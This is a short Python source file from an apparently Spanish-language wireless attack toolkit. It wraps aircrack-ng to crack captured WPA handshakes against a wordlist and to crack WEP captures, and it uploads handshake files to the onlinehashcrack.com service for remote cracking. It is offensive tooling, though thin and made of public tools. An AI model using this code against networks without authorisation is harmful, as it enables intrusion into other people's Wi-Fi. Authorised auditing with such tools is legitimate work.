import os
from pandora.utils.program import ProgramBase
from pandora.utils.httpreq import post
from pandora.definitions import TEMP_PATH
from pandora.config import TIMEOUT_WPA, TIMEOUT_WEP, WPA_ONLINE_MAIL


class Aircrack(ProgramBase):
    program = "aircrack-ng"
    def __init__(self, dirpath=TEMP_PATH):
        super().__init__()
        self.dirpath = dirpath

    def crack_wpa_handshake(self, path_to_handshake, path_to_dictionary, timeout=TIMEOUT_WPA):

        command = [self.program, path_to_handshake, '-w', path_to_dictionary]
        outerr = self.pcaller.runread(command, timeout)

        return outerr[0]


    def crack_wep(self, timeout=20):

        file_path = os.path.join(self.dirpath, "ivs_wep_temp-01.cap")

        command = [self.program, file_path]
        outerr = self.pcaller.runread(command, timeout)
        return outerr[0]


    def online_wpa_crack(self, file_path):
        print("Enviando handhsake a onlinehashcrack.com")
        data = {'email': WPA_ONLINE_MAIL}
        files = {'file' : open(file_path, 'rb')}
        online_hash_crack = post('https://api.onlinehashcrack.com', data, files)

        return online_hash_crack

